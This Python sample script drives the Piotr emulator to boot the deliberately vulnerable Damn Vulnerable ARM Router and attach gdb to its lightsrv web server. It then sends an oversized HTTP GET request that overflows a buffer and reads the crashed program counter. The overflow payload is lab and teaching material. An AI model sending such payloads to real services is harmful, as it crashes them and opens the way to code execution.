"""
Damn Vulnerable ARM Rooter Lightsrv buffer overflow automated exploitation

This sample Python script instruments Piotr to launch an emulated Damn Vulnerable
ARM Router device, attach a debugger to the remote process, trigger the vulnerability
and retrieve the value of PC once the target process crashed.
"""

import socket
from time import sleep
from piotr.api import Piotr, Device

# Retrieve our Damn Vulnerable ARM Router device (called dvar)
device = Device('dvar')

# Create an instance in background, called 'test'
inst = device.run(alias='test', background=True)
print('Waiting 10 seconds for the device to boot up.')
sleep(10)

# If instance has been created, then try to debug and exploit
if inst is not None:
    # Start target
    inst.exec_host('target-start', wait=False)

    # Wait for target to start (it may takes a few seconds for our target
    # process to start)
    print('Waiting for emulated guest to start ...')
    sleep(5)

    # Look for our target process PID
    print('Searching for process lightsrv ...')
    target_pid = inst.pid('/usr/bin/lightsrv')

    if target_pid>0:
        print('Target process found (pid=%d), attaching debugger ...' % target_pid)
        
        # launch a gdb and attach it
        dbg = inst.debug(target_pid)

        # configure gdb behavior on fork
        dbg.set_gdb_variable('follow-fork-mode', 'child')
        dbg.set_gdb_variable('detach-on-fork', 'off')

        # continue execution
        dbg.cont()

        # trigger a buffer overflow (see https://no-sec.net/writeup-dvar-rop-challenge/)
        print('Triggering buffer overflow !')
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('127.0.0.1', 8080))
        payload = b'GET /' + b'A'*4096 + b' HTTP/1.1\r\nHost: BBBBBBBB\r\n\r\n'
        s.send(payload)

        # Wait for our target to stop (crash)
        dbg.wait()

        print('Lightsrv has stopped, checking PC register')
        # Check if debugged process has exited
        if dbg.state == dbg.TARGET_EXITED:
            pc = dbg.read_register('pc')
            print('Crashed occured, PC=0x%08X' % pc)
        else:
            print('Oops, target process has not exited...')

        # Stop instance
        inst.stop()
    else:
        print('Target process lightsrv not found :/')


